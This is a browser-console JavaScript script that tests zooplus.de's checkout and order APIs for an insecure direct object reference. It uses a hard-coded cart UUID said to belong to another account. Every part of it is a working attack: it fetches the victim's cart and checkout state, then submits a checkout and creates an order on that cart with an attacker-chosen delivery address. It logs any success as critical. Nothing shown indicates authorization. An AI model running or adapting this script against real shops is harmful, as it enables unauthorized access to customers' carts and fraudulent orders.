// Test Checkout Flow for IDOR
// Execute in browser console while logged in as Account B

const CART_UUID = "6bd223b4-5040-4faa-ba85-6a85c1ec2d50"; // Account A's cart UUID

(async function () {
  console.log("[*] ========================================");
  console.log("[*] TESTING CHECKOUT FLOW IDOR");
  console.log("[*] ========================================");

  // Get cart
  const cart = await fetch(
    `https://www.zooplus.de/checkout/api/cart-api/v2/cart/${CART_UUID}`,
    { credentials: "include" }
  ).then((r) => r.json());

  console.log(`[+] Cart: ${cart.articles.length} items, ${cart.summary.grandTotal} EUR`);

  // Test checkout endpoints
  const checkoutTests = [
    // Get checkout state
    {
      name: "Get Checkout State",
      url: `https://www.zooplus.de/checkout/api/checkout/v2/state?cartUuid=${CART_UUID}`,
      method: "GET",
    },
    // Get checkout state (alternative)
    {
      name: "Get Checkout State (alt)",
      url: `https://www.zooplus.de/semiprotected/api/checkout/state-api/v2/get?cartUuid=${CART_UUID}`,
      method: "GET",
    },
    // Submit checkout
    {
      name: "Submit Checkout",
      url: `https://www.zooplus.de/checkout/api/checkout/v2/submit`,
      method: "POST",
      body: JSON.stringify({
        cartUuid: CART_UUID,
        paymentMethod: "credit_card",
        deliveryAddress: {
          street: "Hacker Street 123",
          city: "Berlin",
          zipCode: "10115",
          country: "DE",
        },
      }),
    },
    // Get order summary
    {
      name: "Get Order Summary",
      url: `https://www.zooplus.de/checkout/api/order/v2/summary?cartUuid=${CART_UUID}`,
      method: "GET",
    },
    // Create order
    {
      name: "Create Order",
      url: `https://www.zooplus.de/checkout/api/order/v2/create`,
      method: "POST",
      body: JSON.stringify({ cartUuid: CART_UUID }),
    },
  ];

  for (const test of checkoutTests) {
    console.log(`\n[*] Testing: ${test.name}`);
    try {
      const response = await fetch(test.url, {
        method: test.method,
        credentials: "include",
        headers: test.body
          ? {
              "Content-Type": "application/json",
              Accept: "application/json",
            }
          : { Accept: "application/json" },
        body: test.body,
      });

      const text = await response.text();
      console.log(`    Status: ${response.status}`);

      if (response.status === 200 || response.status === 201) {
        try {
          const json = JSON.parse(text);
          console.log(`    [!!!] SUCCESS - ${test.name} works!`);
          console.log(`    Response:`, JSON.stringify(json, null, 2).substring(0, 500));
          
          // Check if we can see/modify order
          if (json.orderId || json.orderNumber) {
            console.log(`    [!!!] CRITICAL - Order ID exposed: ${json.orderId || json.orderNumber}`);
          }
        } catch (e) {
          console.log(`    Response: ${text.substring(0, 300)}`);
        }
      } else if (response.status === 403) {
        console.log(`    [*] Protected (403) - Endpoint exists but protected`);
      } else if (response.status === 404) {
        console.log(`    [*] Not found (404)`);
      } else {
        console.log(`    Response: ${text.substring(0, 200)}`);
      }
    } catch (e) {
      console.log(`    Error: ${e.message}`);
    }
  }

  console.log("\n[*] ========================================");
  console.log("[*] CHECKOUT FLOW TESTING COMPLETE");
  console.log("[*] ========================================");
})();





